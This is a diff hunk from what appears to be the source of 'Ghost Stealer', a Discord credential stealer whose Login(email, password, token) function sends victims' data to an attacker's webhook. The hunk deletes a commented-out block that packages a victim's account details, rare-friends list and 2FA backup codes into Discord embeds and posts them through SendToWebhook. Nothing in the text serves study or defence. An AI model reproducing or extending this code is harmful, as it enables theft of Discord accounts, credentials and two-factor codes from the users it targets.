@@ -221,63 +221,7 @@ function Login(email, password, token) {
                     }
                 }
             ]
-        };
-	/*
-        const hqlistt = {
-          username: "Ghost Stealer",
-          content: "",
-          avatar_url: GHOSTEALER,
-          embeds: [
-	  {
-            "color": COLORSTEAL,
-            "description": `**HQ LIST** (\`${total_f(json)}\`)`,
-            "fields": [
-              {
-                "name": "**RARE FRIENDS**",
-                "value": calc_f(json),
-                inline: true
-	      }
-            ],
-            "author": {
-              "name": json.username +"#" + json.discriminator + "・" + json.id,
-              "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-            },
-            "footer": {
-              "text": "Ghost Stealer"
-            }
-	    }
-          ]
         }
-        SendToWebhook(JSON.stringify(params))
-        SendToWebhook(JSON.stringify(hqlistt))
-        if (token.startsWith('mfa')) {
-          const mfaembed = {
-            username: "Ghost Stealer",
-            content: "",
-            avatar_url: GHOSTEALER,
-            embeds: [
-	    {
-              "color": COLORSTEAL,
-              "description": `**2FA CODES**`,
-              "fields": [
-                {
-                  "name": "**ALL CODES**",
-                  "value": mfas(token),
-                  inline: true
-		}
-              ],
-              "author": {
-                "name": json.username +"#" + json.discriminator + "・" + json.id,
-                "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-              },
-              "footer": {
-                "text": "Ghost Stealer"
-              }
-	      }
-            ]
-          }
-          SendToWebhook(JSON.stringify(mfaembed))
-        }*/
     })
 }
 
